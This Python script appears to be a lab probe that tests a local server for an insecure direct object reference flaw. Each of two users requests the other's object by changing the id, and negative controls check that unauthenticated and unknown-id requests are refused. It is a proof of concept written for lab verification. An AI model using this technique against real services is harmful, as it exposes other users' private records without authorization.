#!/usr/bin/env python3
"""
lab-06 probe: read another user's object by changing the identifier.

Controls, because a 200 on one request proves little:

1. No token must be refused. If it is not, the endpoint is unauthenticated and this is a different bug.
2. A non-existent id must 404. If it returns something, the endpoint is not reading the store at all.
3. The same technique must work in the other direction, bob reading alice and alice reading bob. One
   direction could be a fixture mistake; both directions is ownership never being checked.
"""
import json
import sys
import urllib.error
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8736"
ALICE = "alice-token"
BOB = "bob-token"


def get(path, token=None):
    req = urllib.request.Request(BASE + path)
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}


def main():
    # bob reads object 1, which belongs to alice
    s1, b1 = get("/object/1", BOB)
    bob_reads_alice = s1 == 200 and b1.get("object", {}).get("owner") == "alice"

    # alice reads object 2, which belongs to bob, so the flaw is symmetric
    s2, b2 = get("/object/2", ALICE)
    alice_reads_bob = s2 == 200 and b2.get("object", {}).get("owner") == "bob"

    c1, _ = get("/object/1")                 # no token
    c2, _ = get("/object/999", BOB)          # non-existent id
    c3, b3 = get("/object/2", BOB)           # owns it, must work
    control = {
        "no_token_refused": c1 == 401,
        "unknown_id_is_404": c2 == 404,
        "owner_can_read_own": c3 == 200 and b3.get("object", {}).get("owner") == "bob",
    }

    attack_ok = bob_reads_alice and alice_reads_bob
    result = {
        "lab": "lab-06-idor",
        "factor": "L06-036",
        "pattern": None,
        "attack": {"bob_reads_object_1": bob_reads_alice, "alice_reads_object_2": alice_reads_bob,
                   "leaked_field": b1.get("object", {}).get("body") if bob_reads_alice else None},
        "negative_control": control,
        "oracle": "a record whose owner is not the caller returned to the caller's token",
        "attack_confirmed": attack_ok,
        "control_clean": all(control.values()),
        "verdict": "OBSERVED" if (attack_ok and all(control.values())) else "INCONCLUSIVE",
    }
    print(json.dumps(result, indent=1))
    return 0 if result["verdict"] == "OBSERVED" else 1


if __name__ == "__main__":
    sys.exit(main())
